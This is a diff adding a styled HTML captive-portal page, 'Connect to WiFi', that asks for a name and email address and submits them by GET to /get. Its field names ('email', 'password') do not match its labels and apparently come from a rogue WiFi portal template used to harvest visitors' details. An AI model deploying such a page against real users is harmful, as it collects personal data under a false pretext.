@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>WiFi Access Portal</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      background: #f4f4f4;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      min-height: 100%;
+    }
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+    .container {
+      width: 340px;
+      background: #fff;
+      padding: 36px 28px 32px 28px;
+      border-radius: 18px;
+      box-shadow: 0 8px 30px #aaa4;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    h2 { margin-bottom: 16px; color: #185abc; font-size: 1.55em; text-align: center; }
+    label {
+      margin: 13px 0 5px;
+      font-weight: 500;
+      width: 100%;
+      text-align: left;
+    }
+    input[type="text"], input[type="email"] {
+      width: 100%;
+      padding: 11px;
+      margin-bottom: 12px;
+      border: 1px solid #c6c6c6;
+      border-radius: 6px;
+      font-size: 1em;
+      background: #f8fafd;
+      box-sizing: border-box;
+      display: block;
+    }
+    .btn {
+      background: linear-gradient(90deg, #185abc 80%, #5fc3e4);
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      padding: 12px;
+      font-size: 1.1em;
+      width: 100%;
+      cursor: pointer;
+      font-weight: 600;
+      transition: background 0.2s;
+      margin-top: 10px;
+    }
+    .btn:hover { background: linear-gradient(90deg, #5fc3e4, #185abc 70%); }
+    .info { font-size: 0.97em; color: #555; margin-bottom: 24px; text-align: center;}
+    .logo { display: block; margin: 0 auto 14px; width: 54px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <svg class="logo" width="54" height="54" viewBox="0 0 54 54" fill="none">
+      <circle cx="27" cy="27" r="27" fill="#185abc"/>
+      <path d="M14 22C21.5 15 32.5 15 40 22" stroke="#fff" stroke-width="2.6" stroke-linecap="round"/>
+      <path d="M19.5 27C24.5 22.5 29.5 22.5 34.5 27" stroke="#fff" stroke-width="2.6" stroke-linecap="round"/>
+      <path d="M24 31.5C25.5 30 28.5 30 30 31.5" stroke="#fff" stroke-width="2.6" stroke-linecap="round"/>
+      <circle cx="27" cy="38" r="1.9" fill="#fff"/>
+    </svg>
+    <h2>Connect to WiFi</h2>
+    <div class="info">To access free internet, please verify your details:</div>
+    <form method="GET" action="/get" style="width: 100%;">
+      <label for="email">Full Name</label>
+      <input type="text" id="email" name="email" placeholder="First & last name" required>
+      <label for="password">Email Address</label>
+      <input type="email" id="password" name="password" placeholder="john.doe@example.com" required>
+      <button class="btn" type="submit">Connect!</button>
+    </form>
+  </div>
+</body>
+</html>
